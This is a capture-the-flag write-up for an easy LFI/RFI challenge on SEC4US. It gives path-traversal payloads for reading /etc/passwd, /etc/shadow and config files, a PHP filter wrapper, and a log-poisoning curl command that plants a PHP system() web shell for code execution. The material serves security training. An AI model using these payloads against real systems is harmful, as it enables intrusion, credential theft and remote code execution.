# maq113: Cavucar aos 80km

Writeup for the **Cavucar aos 80km** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** LFI/RFI  
> **Difficulty:** Easy  
> **Points:** 113

---

## Overview

A web application includes files based on user-controlled input without proper validation, enabling Local File Inclusion (LFI) and potentially Remote File Inclusion (RFI) to read sensitive files or execute arbitrary code.

## Reconnaissance

Scan the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Browse the application and identify parameters that load pages or templates dynamically:

```
http://<TARGET_IP>/index.php?page=home
```

## Exploitation

### Step 1: Test for LFI

Attempt directory traversal to read local files:

```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
```

Use PHP wrappers if direct traversal is filtered:

```
?page=php://filter/convert.base64-encode/resource=index
```

### Step 2: Read Sensitive Files

Extract configuration files, credentials, and source code:

```
?page=../../../etc/shadow
?page=../../../var/www/html/config.php
```

Decode base64 output when using PHP filters.

### Step 3: Escalate to RCE

If log files are accessible, poison them for code execution:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET_IP>/
```

Then include the poisoned log:

```
?page=../../../var/log/apache2/access.log&cmd=id
```

### Step 4: Obtain a Shell and Flag

Use log poisoning or PHP wrapper chains to spawn a reverse shell and retrieve the flag.

## Privilege Escalation

Enumerate the system after gaining shell access:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Data from Local System            | T1005     |
| Ingress Tool Transfer             | T1105     |

### CWE

- **CWE-98:** Improper Control of Filename for Include/Require Statement in PHP Program
- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

---

Inclusion functions are roads: without guardrails, a single `../` takes you exactly where the developer never intended you to go.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
